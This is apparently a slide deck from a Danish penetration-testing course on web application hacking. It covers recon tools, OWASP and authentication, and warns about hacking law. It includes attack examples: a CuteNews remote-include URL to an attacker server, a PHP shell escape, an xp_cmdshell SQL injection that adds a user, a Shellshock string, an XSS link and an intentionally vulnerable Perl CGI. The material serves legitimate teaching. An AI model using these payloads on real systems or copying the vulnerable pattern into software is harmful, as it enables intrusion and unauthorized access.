\documentclass[Screen16to9,17pt]{foils}
\usepackage{zencurity-slides}

\externaldocument{kea-pentest-exercises}
\selectlanguage{english}

%VF 3 Netværkspenetrationstest (5 ECTS)
% Indhold
%Den studerende lærer om hvordan en penetration test udføres, samt kan indhente oplysninger om de seneste sårbarheder, og kan benytte sig af de relevante værktøjer til dette formål.
%Viden
%Den studerende viden om og forståelse for:
%* Etiske samt kontraktuelle forhold omkring en penetrationstest.
%* Standardiseringorganisationers og myndigheders krav til og om penetrationstesting
%Færdigheder
%Den studerende kan:
%Tage højde for sikkerhedsaspekter ved at:
%* Anvende relevante metoder ved udførsel af en penetrationstest
%* Udarbejde en angrebsplan ud fra indsamlede oplysninger om et mål
%* Finde sårbarheder i et givet system
% * Dokumentere og rapportere fundne sårbarheder
% Kompetencer
%Den studerende kan:
% * Planlægge en penetration test, samt eksekvere den både ved brug af værktøjer og manuelt.


\begin{document}

\mytitlepage
{5. Web Application Hacking - and some IoT}
{KEA Kompetence Penetration Testing}




\slide{Plan for today}

\begin{list1}
\item Subjects
\begin{list2}
\item Web Application Hacking - and some IoT
\item Common web application issues
\item Attacking Authentication
\item Session IDs
\end{list2}
\item Exercises
\begin{list2}
\item  Try a few attacks in the JuiceShop with web proxy
\end{list2}
\item  Reading Curriculum:
\begin{list2}
\item Grayhat skim chapters 22-25
\end{list2}
\item  Reading Related resources:
\begin{list2}
\item \emph{Pwning OWASP Juice Shop}
\end{list2}
\end{list1}


\slide{Goals: Web Application Hacking intro}

\hlkimage{5cm}{dont-panic.png}
\centerline{\color{titlecolor}\LARGE Don't Panic!}


\begin{list1}
\item Introducere basale penetrationstestmetoder mod webservere og web
  applikationer
\item Gøre deltagerne istand til at udforske området ved at henvise
  til gode kilder
\end{list1}


\slide{Aftale om test af netværk}

{\bfseries Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel indtil 1 år og 6 måneder straffes den, der uberettiget skaffer sig adgang til en andens oplysninger eller programmer, der er bestemt til at bruges i et informationssystem. }

Hacking kan betyde:
\begin{list2}
\item At man skal betale erstatning til personer eller virksomheder
\item At man får konfiskeret sit udstyr af politiet
\item At man, hvis man er over 15 år og bliver dømt for hacking, kan
  få en bøde - eller fængselsstraf i alvorlige tilfælde
\item At man, hvis man er over 15 år og bliver dømt for hacking, får
en plettet straffeattest. Det kan give problemer, hvis man skal finde
et job eller hvis man skal rejse til visse lande, fx USA og
Australien
\item Frygten for terror har forstærket ovenstående - så lad være!
\end{list2}


\slide{Er sikkerhedstest af webservere interessant?}

\hlkimage{10cm}{web-dynamic.png}

\begin{list1}
\item Sikkerhedsproblemer i netværk er mange
\item Kan være et krav fra eksterne - eksempelvis VISA PCI krav
\end{list1}



\slide{Bøger og resourcer}

\centerline{Konsulentens udstyr - vil du være sikkerhedskonsulent}

\begin{list1}
\item Sikkerhedskonsulenterne bruger typisk Open Source værktøjer på Linux og
enkelte systemer med Windows - jeg bruger helst Windows 7 idag
\item Laptops, gerne flere, men een er nok til at lære!
\begin{list2}
\item \emph{A Hands-On Introduction to Hacking
by Georgia Weidman}, June 2014\\
 \link{http://www.nostarch.com/pentesting}
\item \emph{The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws}
Dafydd Stuttard, Marcus Pinto, Wiley September 2011 ISBN: 978-1118026472
\item \emph{Metasploit The Penetration Tester's Guide}
by David Kennedy, Jim O'Gorman, Devon Kearns, and Mati Aharoni\\
\link{http://nostarch.com/metasploit}
\item Metasploit Unleashed - gratis kursus i Metasploit\\
\link{http://www.offensive-security.com/metasploit-unleashed/}
\link{http://mdsec.net/wahh/}
\end{list2}
\end{list1}




\slide{Hackerværktøjer}
% måske til reference afsnit?

\hlkimage{2cm}{hackers_JOLIE+1995.jpg}

\begin{list2}
\item Nmap, Nping - tester porte, godt til firewall admins \link{http://nmap.org}
\item Kali Linux/Backtrack \link{http://kali.org}
\item Metasploit Framework \link{http://www.metasploit.com/}
\item Wireshark avanceret netværkssniffer - \link{http://http://www.wireshark.org/}
\item Skipfish \link{http://code.google.com/p/skipfish/}
\item Burpsuite \link{http://portswigger.net/burp/}
\item OpenBSD operativsystem med fokus
  på sikkerhed  \link{http://www.openbsd.org}
\end{list2}

Billede: Acid Burn / Angelina Jolie fra Hackers 1995

%
%page
\slide{Hvad skal der ske?}

\begin{list1}
\item Tænk som en hacker
\item Rekognoscering
\begin{list2}
\item ping sweep, port scan
\item OS detection - TCP/IP eller banner grab
\item Servicescan - rpcinfo, netbios, ...
\item telnet/netcat interaktion med services
\end{list2}
\item Udnyttelse/afprøvning: nikto, exploit programs
\item Oprydning/hærdning vises måske ikke, men I bør i praksis:
\end{list1}

\vskip 2cm
\centerline{\hlkbig Vi går idag kun efter webservere}


\slide{OSI og Internet modellerne}

\hlkimage{10cm,angle=90}{images/compare-osi-ip.pdf}

I recommend securing from bottom up

\slide{Brug af Wireshark}

\hlkimage{13cm}{images/wireshark-http.png}

Se også \link{https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol}

\slide{Primary HTTP mthods}

\begin{list2}
\item [GET]{\small
Requests a representation of the specified resource. Requests using GET should only retrieve data and should have no other effect. (This is also true of some other HTTP methods.)[1] The W3C has published guidance principles on this distinction, saying, "Web application design should be informed by the above principles, but also by the relevant limitations."[13] See safe methods below.}
\item [HEAD]{\small
Asks for the response identical to the one that would correspond to a GET request, but without the response body. This is useful for retrieving meta-information written in response headers, without having to transport the entire content.}
\item [POST]{\small
Requests that the server accept the entity enclosed in the request as a new subordinate of the web resource identified by the URI. The data POSTed might be, for example, an annotation for existing resources; a message for a bulletin board, newsgroup, mailing list, or comment thread; a block of data that is the result of submitting a web form to a data-handling process; or an item to add to a database.[14]}
\item [PUT]{\small
Requests that the enclosed entity be stored under the supplied URI. If the URI refers to an already existing resource, it is modified; if the URI does not point to an existing resource, then the server can create the resource with that URI.[15]}
\end{list2}

Source: \link{https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol}


\slide{Informationsindsamling}

\begin{list1}
\item Indsamling af informationer kan være aktiv eller passiv indsamling i forhold
  til målet for angrebet
\item {\bf passiv} kunne være at lytte med på trafik eller søge i databaser
  på Internet: google, whois, archive.org m.fl.

Eksempel: start Wireshark og browser på samme client

\vskip 1cm
\item {\bf aktiv indsamling} er eksempelvis at sende ICMP pakker og
  registrere hvad man får af svar, portscan m.v.\\

Eksempel: brug SSLScan programmet og udfør mange request mod en server\\
\verb+sslscan --ssl2 server+
\end{list1}

Check dit site med \link{http://www.ssllabs.com}

\slide{Whois systemet}

\begin{list1}
\item IP adresserne administreres i dagligdagen af et antal Internet
  registries, hvor de største er:
\begin{list2}
\item RIPE (Réseaux IP Européens)  \link{http://ripe.net}
\item ARIN American Registry for Internet Numbers \link{http://www.arin.net}
\item Asia Pacific Network Information Center \link{http://www.apnic.net}
\item LACNIC (Regional Latin-American and Caribbean IP Address
  Registry) - Latin America and some Caribbean Islands
  \link{http://www.lacnic.net}
\item AfriNIC African Internet Numbers Registry \link{http://www.afrinic.net}
\end{list2}
\item disse fem kaldes for Regional Internet Registries (RIRs) i
  modsætning til Local Internet Registries (LIRs) og National Internet
  Registry (NIR)
\end{list1}

\vskip 1cm
\centerline{Firefox add-on galore, brug dem - AS nummer, IP, whois, country}



\slide{HTTPS Everywhere}

\hlkimage{5cm}{HTTPS_Everywhere_new_logo.jpg}
\begin{quote}
HTTPS Everywhere is a Firefox extension produced as a collaboration between The Tor Project and the Electronic Frontier Foundation. It encrypts your communications with a number of major websites.
\end{quote}

\centerline{\link{http://www.eff.org/https-everywhere}}

\slide{Shodan \emph{dark google}}

\hlkimage{18cm}{shodan-photosmart.png}

\centerline{\link{http://www.shodanhq.com/search?q=Photosmart}}


\slide{Nmap port sweep efter port 80/TCP}

\begin{alltt}\footnotesize
\small # {\bfseries nmap  -p 80 192.0.2.0/24}

Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
Interesting ports on router.kramse.dk (192.0.2.129):
Port       State       Service
80/tcp     filtered    http

Interesting ports on www.kramse.dk (192.0.2.139):
Port       State       Service
80/tcp     open        http

Interesting ports on  (192.0.2.145):
Port       State       Service
80/tcp     open        http

\end{alltt}

\centerline{\bf When learning Nmap use the Zenmap GUI!}

Book mentions Nmapfe which does not exist anymore, but Zenmap does on most platforms!
\slide{Nping check TCP socket connection}

\begin{alltt}\footnotesize
root@cornerstone03:~# nping --tcp -p80 www.zencurity.dk
Starting Nping 0.7.40 ( https://nmap.org/nping ) at 2017-02-26 17:15 CET
SENT (0.0412s) TCP 185.27.115.6:25250 > 185.129.60.130:80 S ttl=64 id=5872 iplen=40  seq=3020958725 win=1480
RCVD (0.0416s) TCP 185.129.60.130:80 > 185.27.115.6:25250 SA ttl=63 id=4918 iplen=44  seq=394075685 win=16384
SENT (1.0417s) TCP 185.27.115.6:25250 > 185.129.60.130:80 S ttl=64 id=5872 iplen=40  seq=3020958725 win=1480
RCVD (1.0420s) TCP 185.129.60.130:80 > 185.27.115.6:25250 SA ttl=63 id=34525 iplen=44  seq=830276468 win=16384
SENT (2.0431s) TCP 185.27.115.6:25250 > 185.129.60.130:80 S ttl=64 id=5872 iplen=40  seq=3020958725 win=1480
RCVD (2.0435s) TCP 185.129.60.130:80 > 185.27.115.6:25250 SA ttl=63 id=62810 iplen=44  seq=1289199807 win=16384
SENT (3.0446s) TCP 185.27.115.6:25250 > 185.129.60.130:80 S ttl=64 id=5872 iplen=40  seq=3020958725 win=1480
RCVD (3.0449s) TCP 185.129.60.130:80 > 185.27.115.6:25250 SA ttl=63 id=43831 iplen=44  seq=2100284412 win=16384
SENT (4.0460s) TCP 185.27.115.6:25250 > 185.129.60.130:80 S ttl=64 id=5872 iplen=40  seq=3020958725 win=1480
RCVD (4.0463s) TCP 185.129.60.130:80 > 185.27.115.6:25250 SA ttl=63 id=38950 iplen=44  seq=2839712282 win=16384

Max rtt: 0.332ms | Min rtt: 0.257ms | Avg rtt: 0.301ms
Raw packets sent: 5 (200B) | Rcvd: 5 (230B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 4.08 seconds
\end{alltt}

This tool from the Nmap package can verify if firewalls are open etc. \\
Syn Ack is when the firewall and network works, AND web server is started etc.\\
If web server not running, would be RESET instead
\link{http://nmap.org}





\slide{Generic Network Fault Injection}

\begin{list1}
\item Inserting proxies can allow modification of data in transit
\item Can be used for random bit corruption
\item Can often reproduce the data
\item Automate gathering of evidence
\item Book uses simple Random TCP/UDP fault injector, with ARP spoofing
\item Various test cases must tried with potential bad data, examples:
\begin{list2}
\item loooong input - buffer overflows
\item SQL injection - database commands
\item Cross-site scripting
\item Random bytes - recommend using real fuzzers that understand target protocol
\item Metacharacters like null bytes
\end{list2}
\end{list1}


\slide{Apache Tomcat Null Byte sårbarhed}

\hlkimage{20cm}{tomcat-exploit-bid-6721.png}

\begin{list1}
\item BID 6721 Apache Tomcat Null Byte Directory/File Disclosure Vulnerability
\item \link{http://www.securityfocus.com/bid/6721/}
\item CAN-2003-0042
\end{list1}


\slide{Apache Tomcat sårbarhed - sårbar 3.3.1}

\hlkimage{25cm}{tomcat-exploit-bid-6721-result.png}

\centerline{Sårbar version af Tomcat kører på serveren}

\slide{Apache Tomcat sårbarhed - opdateret Tomcat 5.5.20}

\hlkimage{25cm}{tomcat-exploit-bid-6721-non-result.png}

\centerline{efter \emph{opgradering} er serveren ikke sårbar mere}


\slide{Curl - the HTTP swiss army knife}

\hlkimage{10cm}{curl-example-host.png}

\begin{quote}
	What is curl?
curl is a command line tool and library for transferring data with URL syntax, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP. curl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, HTTP/2, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, kerberos...), file transfer resume, proxy tunneling and more.
\end{quote}

Source: \link{http://curl.haxx.se/}


\slide{OWASP top ten}

\hlkimage{10cm}{owasp.jpg}

\begin{quote}
The OWASP Top Ten provides a minimum standard for web application
security. The OWASP Top Ten represents a broad consensus about what
the most critical web application security flaws are.
\end{quote}

\begin{list1}
\item The Open Web Application Security Project (OWASP)
\item OWASP har gennem flere år udgivet en liste over de 10 vigtigste
  sikkerhedsproblemer for webapplikationer
\item \link{http://www.owasp.org}
\item Also has Zed Attack Proxy (ZAP) \url{https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project}
\end{list1}



\slide{CuteNews}

\hlkimage{13cm}{images/cutenews-1.pdf}

% Husk ref til stedet hvor man kan hente softwaren
\centerline{Lille nemt nyhedssystem}
Mit demosystem virker ikke mere, fordi installationen er blevet \emph{for sikker}

\slide{CuteNews}

\hlkimage{14cm}{images/demo-cutenews-1.pdf}

\begin{list1}
\item CuteNews indeholder sårbarheder
\item Sårbarheden er beskrevet på: \link{http://www.osvdb.org/9557}
\item Softwaren findes på: \link{http://cutephp.com/cutenews/}
\end{list1}

\slide{CuteNews - normal virkemåde}

\hlkimage{15cm}{images/demo-cutenews-2.pdf}

\slide{CuteNews - CutePath PHP injection}

\hlkimage{15cm}{images/demo-cutenews-3.pdf}
\begin{list1}
\item \verb!http://server/cutenews/show_archives.php?!\\
{\bfseries \verb!cutepath=http://ondserver/files/pentest/!}
\end{list1}

\slide{CuteNews - detaljer}

\begin{list2}
\item Henter config.php i cutepath - søgesti
\item Cutepath kan ændres og derved kan filen \verb+data/config.php+ hentes
  fra en vilkårlig server på Internet
\item Webserveren \emph{henter filen} - ud
gennem firewall
\item PHP fortolkeren på webserveren udfører kommandoerne
\end{list2}
\centerline{\bf NB: ikke kun problem for PHP}


\slide{PHP shell escapes}

\begin{list1}
\item Hvad indeholder hackerens udgave af filen \verb+data/config.php+ \\
- alt, bagdøre, hack scripts, exploits
\end{list1}
\begin{alltt}
<pre>
<?php passthru("{\bfseries netstat -an && ifconfig -a}"); ?>
</pre>
\end{alltt}
\begin{list1}
\item Andre shell escapes:
\begin{list2}
\item Perl: \verb+print `/usr/bin/finger $input{'command'}`;+
\item UNIX shell: \verb+`echo hej`+
\item Microsoft SQL: \verb+exec master..xp_cmdshell 'net user test testpass /ADD'+
\end{list2}
\end{list1}
%$

\vskip 1 cm

\centerline{\bfseries resultat: webserveren sender data ud via normal HTTP}


\slide{CuteNews opsummering}

\begin{list1}
\item Opsummering af CuteNews
\begin{list2}
\item at man skal validere alle input
\item man skal passe på \emph{shell escapes}
\item Pas på små programmer du lægger på et website
\item Pas på STORE programmer du lægger på et website
\end{list2}
\item {\color{red}
Man kan altså ikke stole på brugeren!}
\end{list1}

\slide{OWASP WebGoat}

\hlkimage{8cm}{WebGoat.png}

\begin{list1}
\item WebGoat fra OWASP, \link{http://www.owasp.org}
\item Træningsmiljø til webhacking
\item Downloades som Zipfil og kan afvikles direkte på en almindelig laptop
\end{list1}

\link{https://www.owasp.org}


\slide{Bonus Øvelse: Prøv OWASP WebGoat}

\hlkimage{6cm}{exercise}

\begin{list1}
\item Prøv WebGoat - enten på fælles eller hvis du selv har downloadet
\item Hentes som Zip fil og lytter som default kun på localhost
\item Anbefales at afvikle den på maskine med NAT, eller evt. på Kali
\end{list1}


\slide{Konfigurationsfejl - ofte overset}

\begin{list1}
\item Forkert brug af programmer er ofte overset
\begin{list2}
\item opfyldes forudsætningerne
\item er programmet egnet til dette miljø
\item er man udannet/erfaren i dette produkt
\end{list2}
\item Kunne I finde på at kopiere cmd.exe til
/scripts kataloget på en IIS?
\item Det har jeg engang været ude for at en kunde havde gjort!
\item Tilsvarende ser vi jævnligt eksempler på at folk tager input direkte over i shell på Linux
\end{list1}


\slide{Proof of concept programs exist - god or bad?}

\centerline{Some of the tools released shortly after Heartbleed announcement}
\begin{list2}
\item \link{https://github.com/FiloSottile/Heartbleed} tool i Go\\
site \link{http://filippo.io/Heartbleed/}
\item \link{https://github.com/titanous/heartbleeder} tool i Go
\item \link{http://s3.jspenguin.org/ssltest.py} PoC
\item \link{https://gist.github.com/takeshixx/10107280} test tool med STARTTLS support
\item \link{http://possible.lv/tools/hb/} test site
\item \link{https://twitter.com/richinseattle/status/453717235379355649} Practical Heartbleed attack against session keys links til, \link{https://www.mattslifebytes.com/?p=533} og "Fully automated here "\\ \link{https://www.michael-p-davis.com/using-heartbleed-for-hijacking-user-sessions/}

\item Metasploit er også opdateret på master repo\\ \link{https://twitter.com/firefart/status/453758091658792960}\\
\link{https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb}
\end{list2}



\slide{Shellshock CVE-2014-6271 - and others}

\hlkimage{13cm}{shellshock-ubuntu.png}

Source:
\link{https://en.wikipedia.org/wiki/Shellshock_(software_bug)}

\centerline{Kan udnyttes over HTTP, hvis data rammer en bash shell}

\slide{Shellshock - multiple vulnerabilities}

Here is an example of a system that has a patch for CVE-2014-6271 but not CVE-2014-7169:

\hlkimage{15cm}{shellshock-CVE-2014-7169.png}


\verb+X='() { (a)=>\' bash -c "echo date"+

Source: \link{https://en.wikipedia.org/wiki/Shellshock_(software_bug)}


\slide{The Exploit Database - dagens buffer overflow}

\hlkimage{13cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}



\slide{Nikto webscanner}

\hlkimage{2cm}{nikto.jpg}

\begin{quote}
{\bf Description}
Nikto is an Open Source (GPL) web server scanner which performs
comprehensive tests against web servers for multiple items, including
over 3200 potentially dangerous files/CGIs, versions on over 625
servers, and version specific problems on over 230 servers. Scan items
and plugins are frequently updated and can be automatically updated
(if desired).
\end{quote}

\begin{list1}
\item Nem at starte, checker en hel del - og kan selvfølgelig udvides
\item \verb+nikto -host 127.0.0.1 -port 8080+
\item Vi afprøver nu følgende programmer sammen:
\item Nikto web server scanner \link{http://cirt.net/nikto2}
\end{list1}


\slide{Demo: Nikto}

\begin{alltt}
\footnotesize
Script started on Tue Nov  7 17:43:54 2006
$  nikto -host 127.0.0.1 -port 8080 ^M
---------------------------------------------------------------------------
- Nikto 1.35/1.34     -     www.cirt.net
+ Target IP:       127.0.0.1
+ Target Hostname: localhost.pentest.dk
+ Target Port:     8080
+ Start Time:      Tue Nov  7 17:43:59 2006
...
+ /examples/ - Directory indexing enabled, also default JSP examples. (GET)
+ /examples/jsp/snp/snoop.jsp - Displays information about page
retrievals, including other users. (GET)
+ /examples/servlets/index.html - Apache Tomcat default JSP pages
present. (GET)
\end{alltt}
%$

\begin{list1}
\item Demo nikto - burde finde nogle ting
\item Falske positiv vs falske negativ!
\end{list1}

\slide{Øvelse: Prøv nikto}

\hlkimage{6cm}{exercise}

\begin{list1}
\item Prøv nikto - burde finde nogle ting
\item Falske positiv vs falske negativ!
\item Prøv den mod www.kramse.org eller lokal WebGoat instans
\end{list1}


\slide{Sqlmap}

\begin{quote}\small
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

Features
\end{quote}

\begin{list1}
\item Automatic SQL injection and database takeover tool
\link{http://sqlmap.org/}
\end{list1}


\slide{sqlmap features}

\hlkimage{15cm}{sqlmap-features-1.png}

Not a complete list!

Source: \link{http://sqlmap.org/}

\slide{Cross-site scripting}

Vi har primært snakket om server angreb - men klienter er også udsatte

\begin{list1}
\item Hvis der inkluderes brugerinput I websider som vises, kan
der måske indføjes ekstra information/kode.
\item Hvis et CGI program, eksempelvis comment.cgi blot bruger værdien af "mycomment" vil
følgende URL give anledning til cross-site scripting
\begin{alltt}
<A HREF="http://example.com/comment.cgi?
mycomment=<SCRIPT>malicious code</SCRIPT>
">Click here</A>
\end{alltt}
\item Hvis der henvises til kode kan det endda give anledning til
afvikling i anden "security context"
\item Kilde/inspiration:
  \link{http://www.cert.org/advisories/CA-2000-02.html}
\end{list1}

\slide{Mini proxy: Tamper Data}


\hlkimage{16cm}{tamper-data.png}

Udvidelse til Firefox som opfanger request og kan modificere inden de sendes\\
\link{https://addons.mozilla.org/en-US/firefox/addon/tamper-data/}


\slide{Burp Suite}

\hlkimage{14cm}{burp-suite-1.png}

\begin{list1}
\item Burp Suite af Dafydd Stuttard \link{http://portswigger.net/burp/}
\item Twitter @PortSwigger
\end{list1}

\slide{Burpsuite}

\begin{quote}
Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities.

Burp gives you full control, letting you combine advanced manual techniques with state-of-the-art automation, to make your work faster, more effective, and more fun.
\end{quote}

Burp suite indeholder både proxy, spider, scanner og andre værktøjer i samme pakke

\link{http://portswigger.net/burp/}\\
\link{https://pro.portswigger.net/bappstore/}


\slide{Skipfish}

\hlkimage{12cm}{skipfish-screen.png}

\begin{list1}
\item Vi afprøver nu måske følgende program sammen:
\item Skipfish fully automated, active web application security reconnaissance tool by Michal Zalewski \link{http://code.google.com/p/skipfish/}
\end{list1}


\slide{Udviklingsstandarder}

\begin{list1}
\item Hvad gør I for at undgå problemer som de her nævnte?
- kan man gøre mere?
\item Man børe være klar over hvilke teknologier man bruger
\item Standardiser på et mindre antal produkter, biblioteker, sprog
\item Regler og procedurer skal hele tiden opdateres:
\begin{list2}
\item Kvalitetssikring
\item Retningslinier for tilladte tags
\item Retningslinier for brug af SQL
\end{list2}

\item Ved at fokusere på antallet af produkter kan man måske
  indskrænke mulighederne for fejl, høj kvalitet er ofte mere sikkert

\item {\bf nye produkter kan være farlige til man lærer dem at kende!}
\end{list1}

\slide{Retningslinier}

\begin{list2}
\item Hvis der ikke findes retningslinier for udvikling så etabler disse
\item eksempel:\\
javascript må gerne benyttes til at validere forms for at give hurtig
feedback til brugeren
\item serveren der modtager input fra brugeren validerer alle data
  sikkerhedsmæssigt
\item Retningslinierne er medvirkende til at foretage
en afbalanceret investering i sikkerheden
\item undgå dyre hovsa løsninger
\item undgå huller i sikkerheden, ens niveau

\item Der findes vejledninger til både gamle og nye sprog/systemer, \\
eks Ruby On Rails Security Guide\\
\link{http://guides.rubyonrails.org/security.html}

\item OWASP Cheat sheets\\
\link{https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet}
\end{list2}



\slide{Change management}

\begin{list1}
\item Er der tilstrækkeligt med fokus på software i produktion
\item Kan en vilkårlig server nemt reetableres
\item Foretages rettelser direkte på produktionssystemer
\item Er der fall-back plan
\item Burde være god systemadministrator praksis
\vskip 2cm
\item Undgå også opdatering af prod databaser med manuelle SQL queries
\end{list1}



\slide{Insecure programming}

\vskip 2 cm

\begin{list1}
\item Problem:\\
Ønsker et simpelt CGI program, en web udgave af finger
\item Formål:\\
Vise oplysningerne om brugere på systemet
\end{list1}

\slide{review af nogle muligheder}

\begin{list1}
\item ASP
\begin{list2}
\item server scripting, meget generelt - man kan alt
\end{list2}

\item SQL
\begin{list2}
\item databasesprog - meget kraftfuldt
\item mange databasesystemer giver mulighed for specifik tildeling af
  privilegier "grant"
  \end{list2}
\item JAVA
\begin{list2}
\item generelt programmeringssprog
\item bytecode verifikation
\item indbygget sandbox funktionalitet
\end{list2}
\item Perl og andre generelle programmeringssprog
\item Pas på shell escapes!!!
\end{list1}

\slide{Hello world of insecure web CGI}

\begin{list1}
\item Demo af et sårbart system - badfinger
\item Løsning:
\begin{list2}
\item Kalde finger kommandoen
\item et Perl script
\item afvikles som CGI
\item standard Apache HTTPD 1.3 server
\end{list2}
\end{list1}

\slide{De vitale - og usikre dele}

{\small
\begin{verbatim}
print "Content-type: text/html\n\n<html>";
print "<body bgcolor=#666666 leftmargin=20 topmargin=20";
print "marginwidth=20 marginheight=20>";
print <<XX;
<h1>Bad finger command!</h1>
<HR COLOR=#000>
<form method="post" action="bad_finger.cgi">
Enter userid: <input type="text" size="40" name="command">
</form>
<HR COLOR=#000>
XX
if(&ReadForm(*input)){
    print "<pre>\n";
    print "will execute:\n/usr/bin/finger $input{'command'}\n";
    print "<HR COLOR=#000>\n";
    print `/usr/bin/finger $input{'command'}`;
    print "<pre>\n";
}
\end{verbatim}}


\slide{SQL injection}

\begin{list1}
\item SQL Injection FAQ
\link{http://www.sqlsecurity.com}:
\item \begin{alltt}\small
Set myRecordset = myConnection.execute
("SELECT * FROM myTable
WHERE someText ='" & request.form("inputdata") & "'")
med input: ' exec master..xp_cmdshell 'net user test testpass /ADD' --
\end{alltt}
\item modtager og udfører serveren:
\item \begin{alltt}
SELECT * FROM myTable
WHERE someText ='' exec master..xp_cmdshell
'net user test testpass /ADD'--'
\end{alltt}
\item -- er kommentar i SQL
\item Derefter er det kun platformen, OS, og rettighederne der afgør problemets omfang
\end{list1}

\centerline{Dette er den klassiske SQL injection mod Windows, fra ~2000}


\slide{Cross-site scripting}

Vi har primært snakket om server angreb - men klienter er også udsatte

\begin{list1}
\item Hvis der inkluderes brugerinput I websider som vises, kan
der måske indføjes ekstra information/kode.
\item Hvis et CGI program, eksempelvis comment.cgi blot bruger værdien af "mycomment" vil
følgende URL give anledning til cross-site scripting
\begin{alltt}
<A HREF="http://example.com/comment.cgi?
mycomment=<SCRIPT>malicious code</SCRIPT>
">Click here</A>
\end{alltt}
\item Hvis der henvises til kode kan det endda give anledning til
afvikling i anden "security context"
\item Kilde/inspiration:
  \link{http://www.cert.org/advisories/CA-2000-02.html}
\end{list1}

\centerline{plus at folk der bruger samme password på flere sites ...}

jeps, vi har talt om cross-site scripting i +15 år nu ...
\slide{Opsummering websikkerhed}

\begin{list1}
\item Husk hidden fields er ikke mere skjulte end
"view source"-knappen i browseren
\item serverside validering er nødvendigt
\item SQL injection er nemt at udføre og almindeligt
\item Cross-site scripting kan have uanede muligheder
\end{list1}



\slide{Attacking Authentication}


Passwords vælges ikke tilfældigt

\hlkimage{17cm}{50-most-used-passwords.png}

Source:
\link{https://wpengine.com/unmasked/}

\slide{Brute Force Testing}

\begin{list1}
\item hvad betyder bruteforcing?\\
afprøvning af alle mulighederne
\end{list1}

\begin{alltt}\footnotesize
Hydra v2.5 (c) 2003 by van Hauser / THC <vh@thc.org>
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]]
[-o FILE] [-t TASKS] [-g TASKS] [-T SERVERS] [-M FILE] [-w TIME]
[-f] [-e ns] [-s PORT] [-S] [-vV] server service [OPT]

Options:
  -S        connect via SSL
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN  or -L FILE login with LOGIN name, or load several logins from FILE
  -p PASS   or -P FILE try password PASS, or load several passwords from FILE
  -e ns     additional checks, "n" for null password, "s" try login as pass
  -C FILE   colon seperated "login:pass" format, instead of -L/-P option
  -M FILE   file containing server list (parallizes attacks, see -T)
  -o FILE   write found login/password pairs to FILE instead of stdout
...
\end{alltt}




\slide{Session IDs}

\begin{list2}
\item Session IDs tie the user with the state on the server
\item Must be randomly assigned, otherwise an attacker can guess a valid ID
\item Common problems, time based or predictable in some way
\item Check code for generating IDs or measure - Phase Space Analysis
\end{list2}


\exercise{ex:sw-startjuice}

\exercise{ex:js-burp}

\exercise{ex:juiceshop-attack}


\slidenext{}

\end{document}
